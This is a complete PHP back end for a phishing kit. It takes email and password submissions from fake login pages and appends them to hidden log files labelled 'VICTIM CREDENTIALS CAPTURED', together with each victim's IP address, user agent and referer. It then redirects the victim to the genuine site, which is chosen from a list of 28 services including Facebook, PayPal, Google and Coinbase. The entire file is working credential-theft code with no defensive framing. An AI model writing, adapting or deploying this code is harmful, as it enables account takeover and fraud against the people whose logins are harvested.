<?php
session_start();
date_default_timezone_set('Asia/Jakarta');

$log_file = '.tokens.txt';
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$time = date('Y-m-d H:i:s');
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct';

if(isset($_POST['email']) && isset($_POST['pass'])) {
    $email = $_POST['email'];
    $pass = $_POST['pass'];
    $site = isset($_POST['site']) ? $_POST['site'] : 'unknown';
    
    $log_data = "=========================\n";
    $log_data .= "VICTIM CREDENTIALS CAPTURED\n";
    $log_data .= "=========================\n";
    $log_data .= "Site: " . strtoupper($site) . "\n";
    $log_data .= "Email/Username: $email\n";
    $log_data .= "Password: $pass\n";
    $log_data .= "IP Address: $ip\n";
    $log_data .= "User Agent: $user_agent\n";
    $log_data .= "Referer: $referer\n";
    $log_data .= "Time: $time\n";
    $log_data .= "=========================\n\n";
    
    file_put_contents($log_file, $log_data, FILE_APPEND);
    
    // Also save to site-specific log
    file_put_contents("sites/$site/.logs.txt", $log_data, FILE_APPEND);
    
    // Redirect to real site
    $redirects = array(
        'facebook' => 'https://facebook.com',
        'instagram' => 'https://instagram.com',
        'google' => 'https://google.com',
        'microsoft' => 'https://microsoft.com',
        'netflix' => 'https://netflix.com',
        'paypal' => 'https://paypal.com',
        'steam' => 'https://steamcommunity.com',
        'twitter' => 'https://twitter.com',
        'playstation' => 'https://playstation.com',
        'github' => 'https://github.com',
        'twitch' => 'https://twitch.tv',
        'pinterest' => 'https://pinterest.com',
        'snapchat' => 'https://snapchat.com',
        'linkedin' => 'https://linkedin.com',
        'ebay' => 'https://ebay.com',
        'dropbox' => 'https://dropbox.com',
        'protonmail' => 'https://protonmail.com',
        'spotify' => 'https://spotify.com',
        'reddit' => 'https://reddit.com',
        'adobe' => 'https://adobe.com',
        'deviantart' => 'https://deviantart.com',
        'badoo' => 'https://badoo.com',
        'origin' => 'https://origin.com',
        'crypto' => 'https://coinbase.com',
        'yahoo' => 'https://yahoo.com',
        'wordpress' => 'https://wordpress.com',
        'yandex' => 'https://yandex.com',
        'vk' => 'https://vk.com'
    );
    
    $redirect_url = isset($redirects[$site]) ? $redirects[$site] : 'https://google.com';
    header("Location: $redirect_url");
    exit();
} else {
    echo "Invalid request";
}
?>